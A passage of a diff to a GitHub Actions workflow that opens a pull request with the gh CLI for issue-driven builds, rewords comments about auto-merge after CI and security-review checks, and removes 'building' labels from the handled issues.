+            "$TIER" "$closes" "🤖 Opened automatically by issue-build.yml." "$RUN_URL")
 
-          # No eligibility label needed: automerge.yml arms native auto-merge on any non-draft,
-          # non-hold PR once the required checks (CI + security-review) go green. Add `hold` to
-          # stop that. (The old confidence-pure → automerge/needs-review labeling was removed
-          # with the confidence taxonomy — see this file's header and three-loop-pipeline.md.)
+          # automerge.yml arms native auto-merge on any non-draft, non-hold PR once required
+          # checks (CI + security-review) go green. Add `hold` to stop that.
           gh pr create --repo "$GITHUB_REPOSITORY" --base "$BASE_BRANCH" --head "$BRANCH" \
-            --title "$TITLE" --body "$body"
+            --title "$title" --body "$body"
 
-          # Release the claim; the PR's `Closes #n` closes the issue on merge.
+          # Release claims; the PR's `Closes #n` closes each issue on merge.
           for n in $nums; do
             gh issue edit "$n" --repo "$GITHUB_REPOSITORY" --remove-label building 2>/dev/null || true
           done
